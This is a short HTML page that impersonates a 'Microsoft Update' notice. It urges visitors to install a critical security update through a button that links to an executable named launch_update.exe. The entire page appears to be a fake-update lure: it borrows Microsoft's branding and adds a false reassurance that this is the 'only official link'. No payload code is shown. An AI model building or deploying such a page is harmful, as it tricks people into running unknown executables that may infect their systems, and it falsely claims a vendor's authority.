<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Update</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border: 1px solid #ccc; text-align: center; }
        h1 { color: #0078d4; }
        .button { background: #0078d4; color: #fff; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
        .warning { color: #d83b01; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Microsoft Update</h1>
        <p>A critical update is available to enhance your system's security. Click below to install now.</p>
        <a href="launch_update.exe" class="button">Install Update</a>
        <p class="warning">Important: Beware of third parties posing as Microsoft. Use only this official link.</p>
    </div>
</body>
</html>
